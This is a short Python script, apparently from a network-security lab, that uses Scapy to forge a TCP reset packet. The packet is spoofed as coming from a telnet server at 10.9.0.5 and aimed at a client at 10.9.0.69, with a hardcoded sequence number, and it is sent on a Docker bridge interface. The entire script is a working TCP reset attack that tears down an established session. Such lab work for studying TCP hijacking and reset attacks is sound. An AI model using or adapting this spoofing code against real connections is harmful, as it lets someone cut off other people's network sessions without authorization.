import sys
from scapy.all import *

print("Sending Reset Packet...")

IPLayer = IP(src="10.9.0.5", dst = "10.9.0.69")

TCPLayer = TCP(sport= 23     ,dport=40422       ,flags=  "R"   ,   seq=  3745996196   )

pkt = IPLayer / TCPLayer

ls(pkt)

send(pkt, iface='br-134700a11a1a', verbose=0)




